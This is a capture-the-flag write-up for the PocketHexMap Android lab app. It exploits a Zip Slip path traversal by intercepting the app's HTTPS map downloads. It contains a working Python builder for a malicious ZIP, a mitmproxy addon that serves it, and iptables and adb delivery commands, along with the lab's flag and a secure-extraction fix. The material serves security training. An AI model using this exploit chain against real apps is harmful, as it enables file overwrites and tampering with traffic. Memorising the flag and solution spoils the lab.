# PocketHexMap — Zip Slip via MITM (Network Interception)

**Flag:** `HXT{zip-path-traversal-1sg17}`  
**Category:** Android / Network Security  
**Vulnerability:** Zip Path Traversal (Zip Slip) — CWE-22  

---

## Objective

> Use network interception to force the creation of the file:
> `/data/media/0/Android/data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax`

---

## Vulnerability Analysis

### Where it lives

**File:** `c/a/a/c/d.java` — method `j(String str, String str2, e eVar)`

```java
public void j(String str, String str2, e eVar) {
    File file = new File(l.A().o(), str2 + "-gh");   // extraction base dir
    // ...
    ZipInputStream zipInputStream2 = new ZipInputStream(new FileInputStream(str));
    for (ZipEntry nextEntry = zipInputStream2.getNextEntry();
         nextEntry != null;
         nextEntry = zipInputStream2.getNextEntry()) {

        // ⚠️  NO path normalisation — getName() is used verbatim
        String str3 = file.getAbsolutePath() + File.separator + nextEntry.getName();
        Log.i("Hextree", "extract file path: " + str3);

        if (nextEntry.isDirectory()) {
            new File(str3).mkdir();
        } else {
            e(zipInputStream2, str3, ...);   // → new FileOutputStream(str3)
        }
    }
}
```

`nextEntry.getName()` returns whatever string was stored in the ZIP archive — including `../../` traversal sequences. Java's `FileOutputStream` resolves those at the OS level, so a crafted entry name can write **outside** the intended `-gh` extraction directory.

### Attack surface

| Component | Detail |
|-----------|--------|
| Protocol  | HTTPS to `storage.googleapis.com` |
| Map list  | `GET /ht-labs-dev-static-files/pocketmaps/maps/map_url-0.13.0_0.json` |
| Map file  | `GET /ht-labs-dev-static-files/pocketmaps/maps/<path>/<time>/<name>.ghz` |
| Downloader | Android `DownloadManager` (bypasses system HTTP proxy) |

---

## Exploit Chain

```
Attacker (mitmweb)
      │
      │  1. Intercept JSON endpoint
      │     → Return fake map list: {"name": "pwned_city", ...}
      │
      │  2. Intercept .ghz download
      │     → Serve malicious ZIP containing traversal entry:
      │        ../../../../../data/io.hextree.pocketmaps/files/
      │            Download/pocketmaps/downloads/hax
      │
      ▼
PocketHexMap (victim)
      │
      │  3. User taps "pwned city" in DownloadMapActivity
      │
      │  4. d.j() extracts ZIP without normalising entry names
      │     → FileOutputStream resolves ../../../.. at OS level
      │     → Writes outside intended -gh dir
      │
      ▼
/data/media/0/Android/data/io.hextree.pocketmaps/files/
    Download/pocketmaps/downloads/hax   ← created ✓
```

---

## Setup

### Tools

- `mitmweb` (mitmproxy) — HTTPS interception
- `adb` — Android Debug Bridge
- Python 3 — payload builder

### Extraction path arithmetic

The app extracts maps to:
```
l.A().o() / <mapName>-gh/
```

On this device `l.A().o()` resolved to:
```
/storage/emulated/0/Android/media/io.hextree.pocketmaps/pocketmaps/maps/
```

Target path:
```
/storage/emulated/0/Android/data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax
```

Traversal from `maps/pwned_city-gh/` to `Android/`:

| `..` steps | Reaches |
|-----------|---------|
| 1 | `maps/` |
| 2 | `pocketmaps/` |
| 3 | `io.hextree.pocketmaps/` |
| 4 | `media/` |
| 5 | `Android/` |

Zip entry name:
```
../../../../../data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax
```

---

## Exploit Code

### `build_ghz.py` — Build the malicious ZIP

```python
import zipfile, sys

OUT = sys.argv[1] if len(sys.argv) > 1 else '/tmp/pwn.ghz'

PAYLOAD = b'PWNED via MITM Zip Slip in PocketHexMap\n'

ENTRIES = [
    'version.txt',   # makes app accept the map as valid
    '../../../../../data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax',
]

with zipfile.ZipFile(OUT, 'w', zipfile.ZIP_DEFLATED) as z:
    for entry in ENTRIES:
        body = b'0.13.0_0\n2099-01-01\n' if entry == 'version.txt' else PAYLOAD
        zi = zipfile.ZipInfo(entry)
        zi.compress_type = zipfile.ZIP_DEFLATED
        z.writestr(zi, body)
```

> **Key:** Python's `ZipFile.writestr()` accepts any string as the entry name — including `../` sequences. Java's `ZipInputStream.getNextEntry().getName()` returns it verbatim.

### `pocketmaps_mitm.py` — mitmproxy addon

```python
from mitmproxy import http
from pathlib import Path
import json

GHZ_PATH   = Path('/tmp/pwn.ghz')
TARGET_HOST = 'storage.googleapis.com'
JSON_PATH   = '/ht-labs-dev-static-files/pocketmaps/maps/map_url-0.13.0_0.json'
GHZ_PREFIX  = '/ht-labs-dev-static-files/pocketmaps/maps/pwn/T/'

def request(flow: http.HTTPFlow) -> None:
    if flow.request.host != TARGET_HOST:
        return

    path = flow.request.path.split('?', 1)[0]

    # 1. Hijack the map list
    if path == JSON_PATH:
        body = json.dumps({
            'maps-0.13.0_0-path': 'pwn',
            'maps-0.13.0_0': [
                {'name': 'pwned_city', 'size': '0.1', 'time': 'T'}
            ],
        }).encode()
        flow.response = http.Response.make(
            200, body, {'Content-Type': 'application/json'})
        return

    # 2. Serve malicious .ghz for any map download
    if path.startswith(GHZ_PREFIX) and path.endswith('.ghz'):
        body = GHZ_PATH.read_bytes()
        flow.response = http.Response.make(
            200, body,
            {'Content-Type': 'application/octet-stream',
             'Content-Length': str(len(body))})
```

> **Why `pwned_city` and not `pwned`?**  
> `c.a.a.g.a.e(String)` splits the map name on `_` and calls `.substring(0, length-1)` on the suffix. A name with no underscore produces an empty suffix string → `"".substring(0, -1)` → `StringIndexOutOfBoundsException` → app crash.

---

## Delivery

Because Android's `DownloadManager` bypasses the system HTTP proxy, the `.ghz` download must be intercepted at a lower level.

### Option A — iptables DNAT (used here)

```bash
# On the emulator (root shell via adb)
iptables -t nat -A OUTPUT -p tcp --dport 443 \
  -j DNAT --to-destination 10.0.2.2:8443
```

```bash
# On the host — mitmweb in reverse-proxy mode
mitmweb \
  --mode reverse:https://storage.googleapis.com \
  --listen-host 0.0.0.0 --listen-port 8443 \
  --set upstream_cert=false \
  -s pocketmaps_mitm.py
```

The DNAT rule redirects all emulator HTTPS to the host's mitmweb. mitmweb presents the installed mitmproxy CA cert (trusted by the system store), terminates TLS, and the addon intercepts the requests.

### Option B — Direct file push (bypass for broken DownloadManager)

If `DownloadManager` / `DownloadProvider` crashes on the target emulator:

```bash
# Push the malicious .ghz to the app's download directory
adb push pwn.ghz \
  /sdcard/Android/data/io.hextree.pocketmaps/files/Download/pwned_city.ghz

# Open DownloadMapActivity — it lists the dir on startup
# and auto-triggers extraction for any .ghz it finds
adb shell am start -n io.hextree.pocketmaps/.activities.DownloadMapActivity
```

`DownloadMapActivity.onCreate()` calls `l.A().g().list()` to enumerate `.ghz` files, then passes them to the `c` AsyncTask which calls `c.a.a.c.c.h()` → extraction starts immediately.

---

## Flag Mechanism

The flag is hidden in `c.c.f()`:

```java
private static void f(Context context) {
    // reversed string = "pocketmaps/downloads/hax"
    String target = new StringBuilder("xah/sdaolnwod/spamtekcop").reverse().toString();
    File haxFile = new File(c.a.a.i.d.c(context), target);

    if (haxFile.exists() && f1618c) {
        // XOR-decode the flag and show as Toast
        Toast.makeText(context, d("YnJ+UVBDWgdaS15CB15YS1xPWFlLRgcbWU0bHVc=", 42), 1).show();
    }
    f1618c = false;
}
```

Decode manually:
```python
import base64
data = base64.b64decode("YnJ+UVBDWgdaS15CB15YS1xPWFlLRgcbWU0bHVc=")
flag = ''.join(chr(b ^ 42) for b in data)
# → HXT{zip-path-traversal-1sg17}
```

`f1618c` is set to `true` in `g()` **only if `hax` does not exist at the start of extraction** — ensuring the flag fires exactly once on a fresh exploit, not on a replay.

---

## Mitigation

```java
// Secure extraction: normalise the entry path and reject traversal
String entryName = nextEntry.getName();
File outFile = new File(extractionDir, entryName).getCanonicalFile();
if (!outFile.getPath().startsWith(extractionDir.getCanonicalPath() + File.separator)) {
    throw new SecurityException("Zip Slip detected: " + entryName);
}
// proceed with FileOutputStream(outFile)
```

The fix is one `getCanonicalFile()` call + a prefix check — the same pattern recommended by Snyk and OWASP.

---

## References

- [Snyk — Zip Slip vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory
